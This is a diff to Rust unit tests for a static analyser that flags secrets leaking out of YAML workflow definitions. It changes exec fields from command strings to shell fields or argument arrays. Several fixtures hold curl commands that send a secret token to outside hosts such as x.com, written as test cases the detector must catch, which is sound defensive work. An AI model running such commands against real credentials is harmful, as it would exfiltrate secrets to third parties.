@@ -154,7 +154,7 @@ secrets:
     #[test]
     fn secret_into_exec_command_leaks() {
         let yaml = format!(
-            "nika: v1\nworkflow: leak\n{SECRETS}tasks:\n  - id: t\n    exec: {{ command: \"curl -H 'Auth: ${{{{ secrets.api_key }}}}' x\" }}\n"
+            "nika: v1\nworkflow: leak\n{SECRETS}tasks:\n  - id: t\n    exec: {{ shell: \"curl -H 'Auth: ${{{{ secrets.api_key }}}}' x\" }}\n"
         );
         let l = leaks_of(&yaml);
         assert_eq!(l.len(), 1);
@@ -165,7 +165,7 @@ secrets:
     #[test]
     fn secret_into_exec_env_leaks() {
         let yaml = format!(
-            "nika: v1\nworkflow: leak\n{SECRETS}tasks:\n  - id: t\n    exec:\n      command: \"printenv\"\n      env:\n        TOKEN: \"${{{{ secrets.api_key }}}}\"\n"
+            "nika: v1\nworkflow: leak\n{SECRETS}tasks:\n  - id: t\n    exec:\n      command: [\"printenv\"]\n      env:\n        TOKEN: \"${{{{ secrets.api_key }}}}\"\n"
         );
         let l = leaks_of(&yaml);
         assert_eq!(l.len(), 1);
@@ -217,8 +217,7 @@ secrets:
 
     #[test]
     fn no_secrets_declared_no_scan() {
-        let yaml =
-            "nika: v1\nworkflow: none\ntasks:\n  - id: t\n    exec: { command: \"echo hi\" }\n";
+        let yaml = "nika: v1\nworkflow: none\ntasks:\n  - id: t\n    exec: { command: [\"echo\", \"hi\"] }\n";
         assert!(leaks_of(yaml).is_empty());
     }
 
@@ -226,7 +225,7 @@ secrets:
     fn with_aliased_secret_now_leaks_with_a_trace() {
         // The review's false negative — fixed by the IFC engine.
         let yaml = format!(
-            "nika: v1\nworkflow: w\n{SECRETS}tasks:\n  - id: t\n    with: {{ tok: \"${{{{ secrets.api_key }}}}\" }}\n    exec: {{ command: \"curl -H ${{{{ with.tok }}}}\" }}\n"
+            "nika: v1\nworkflow: w\n{SECRETS}tasks:\n  - id: t\n    with: {{ tok: \"${{{{ secrets.api_key }}}}\" }}\n    exec: {{ shell: \"curl -H ${{{{ with.tok }}}}\" }}\n"
         );
         let l = leaks_of(&yaml);
         assert_eq!(l.len(), 1);
@@ -236,7 +235,7 @@ secrets:
     #[test]
     fn secret_into_on_finally_cleanup_leaks() {
         let yaml = format!(
-            "nika: v1\nworkflow: w\n{SECRETS}tasks:\n  - id: t\n    exec: {{ command: \"echo build\" }}\n    on_finally:\n      - invoke: {{ tool: \"nika:write\", args: {{ path: \"x\", content: \"${{{{ secrets.api_key }}}}\" }} }}\n"
+            "nika: v1\nworkflow: w\n{SECRETS}tasks:\n  - id: t\n    exec: {{ command: [\"echo\", \"build\"] }}\n    on_finally:\n      - invoke: {{ tool: \"nika:write\", args: {{ path: \"x\", content: \"${{{{ secrets.api_key }}}}\" }} }}\n"
         );
         let l = leaks_of(&yaml);
         assert_eq!(l.len(), 1, "the cleanup leak is reported");
@@ -247,7 +246,7 @@ secrets:
     #[test]
     fn secret_egress_into_outputs_is_reported() {
         let yaml = format!(
-            "nika: v1\nworkflow: w\n{SECRETS}tasks:\n  - id: a\n    exec: {{ command: \"echo ${{{{ secrets.api_key }}}}\" }}\noutputs:\n  leaked: ${{{{ tasks.a.output }}}}\n"
+            "nika: v1\nworkflow: w\n{SECRETS}tasks:\n  - id: a\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\noutputs:\n  leaked: ${{{{ tasks.a.output }}}}\n"
         );
         let e = egresses_of(&yaml);
         assert_eq!(e.len(), 1);
@@ -259,7 +258,7 @@ secrets:
     fn literal_prose_mentioning_secret_is_not_a_leak() {
         // No ${{ }} island → no reference → no leak (the prose false positive).
         let yaml = format!(
-            "nika: v1\nworkflow: w\n{SECRETS}tasks:\n  - id: t\n    exec: {{ command: \"echo 'set secrets.api_key in vault'\" }}\n"
+            "nika: v1\nworkflow: w\n{SECRETS}tasks:\n  - id: t\n    exec: {{ command: [\"echo\", \"'set\", \"secrets.api_key\", \"in\", \"vault'\"] }}\n"
         );
         assert!(
             leaks_of(&yaml).is_empty(),
@@ -456,7 +455,7 @@ secrets:
         host: \"api.x.com\"
 tasks:
   - id: t
-    exec: { command: \"curl -d ${{ secrets.k }} https://api.x.com\" }
+    exec: { command: [\"curl\", \"-d\", \"${{ secrets.k }}\", \"https://api.x.com\"] }
 ";
         let l = leaks_of(yaml);
         assert_eq!(l.len(), 1, "fetch clearance never authorizes exec");
@@ -599,7 +598,7 @@ secrets:
         host_from_self: true
 tasks:
   - id: t
-    exec: { command: \"echo done\" }
+    exec: { command: [\"echo\", \"done\"] }
     on_finally:
       - invoke:
           tool: \"nika:notify\"
@@ -630,12 +629,12 @@ secrets:
     key: RAW
 tasks:
   - id: t
-    exec: { command: \"echo done\" }
+    exec: { command: [\"echo\", \"done\"] }
     on_finally:
       - invoke:
           tool: \"nika:notify\"
           args: { channel: webhook, target: \"${{ secrets.hook }}\", message: \"ok\" }
-      - exec: { command: \"curl -d ${{ secrets.raw }} https://x.com\" }
+      - exec: { command: [\"curl\", \"-d\", \"${{ secrets.raw }}\", \"https://x.com\"] }
 ";
         let l = leaks_of(yaml);
         assert!(
